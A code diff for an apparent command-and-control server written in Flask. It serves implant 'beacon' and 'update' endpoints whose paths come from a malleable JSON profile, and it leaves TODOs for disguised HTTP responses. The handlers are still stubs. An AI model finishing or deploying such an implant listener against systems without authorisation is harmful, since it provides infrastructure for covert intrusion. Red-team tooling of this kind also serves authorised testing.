@@ -7,30 +7,37 @@ app = Flask(__name__)
 
 
 class WebServer(object):
-    # maybe do json parsing in __init__
-    def __init__(self, profile):
+    def __init__(self, protocol, external_address, port, profile):
+        self.protocol = protocol
+        self.external_address = external_address
         self.profile = profile
-        print(self.profile)
+        self.port = port
+        self.profile = profile
 
-    # former beacon.php functionality here
+    def start_webserver(self):
+        if self.protocol == "https":
+            # TO DO: add in flask ssl context here instead of print()
+            print("https protocol selected")
+
+        # reads json profile
+        with open(self.profile) as file:
+            json_data = json.load(file)
+
+        # TO DO: check if json_data["implant"]["beacon_uri"] and json_data["implant"]["update_uri"] exist
+        # if these do not exist, the user has a malformed json profile
+
+        # TO DO: configure malleable http responses via make_response() here
+
+        # TO DO: inserts entry into "listeners" table
+
+        # adds URIs and starts flask web server
+        app.add_url_rule(json_data["implant"]["beacon_uri"], None, self.beacon, methods=["GET", "POST"])
+        app.add_url_rule(json_data["implant"]["update_uri"], None, self.update, methods=["GET", "POST"])
+        #app.add_url_rule("/beacon", None, self.beacon, methods=["GET", "POST"])
+        app.run("0.0.0.0", self.port)
+
     def beacon(self):
-        # parses malleable profile
-        with open(self.profile) as data_file:
-            data = json.load(data_file)
+        return "beacon response"
 
-        # loops through "beacon" json object
-        # configures malleable profile (via resp.headers)
-        resp = make_response()
-
-        for name in data["beacon"]:
-            # prevents beacon "uri" object from being added to the HTTP response headers
-            if name != "uri":
-                resp.headers[name] = data["beacon"][name]
-
-        # TO DO: we should actually do parsing here to check if this an initial implant beacon
-        resp.data = "beacon response"
-        return resp
-
-    def start_webserver(self, port):
-        app.add_url_rule("/beacon", None, self.beacon, methods=["GET", "POST"])
-        app.run("0.0.0.0", port)
+    def update(self):
+        return "update response"
